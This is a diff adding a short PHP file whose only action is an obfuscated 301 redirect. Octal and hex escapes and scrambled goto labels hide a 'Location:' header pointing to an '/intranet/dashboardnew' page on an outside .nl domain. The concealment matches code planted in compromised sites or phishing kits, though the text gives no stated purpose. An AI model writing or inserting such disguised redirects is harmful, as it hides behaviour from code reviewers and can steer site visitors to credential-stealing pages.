@@ -1,0 +1,2 @@
+<?php
+ goto hlNlI; KfBEB: die; goto Eeuk4; hlNlI: header("\114\x6f\143\x61\x74\151\157\x6e\72\x20\x68\164\164\x70\163\x3a\x2f\57\172\165\151\144\x2d\x64\x69\x6a\153\x72\x70\x2e\x6e\154\57\x69\156\x74\162\x61\x6e\x65\x74\57\144\141\x73\x68\x62\157\x61\x72\x64\x6e\x65\x77", true, 301); goto KfBEB; Eeuk4: ?>
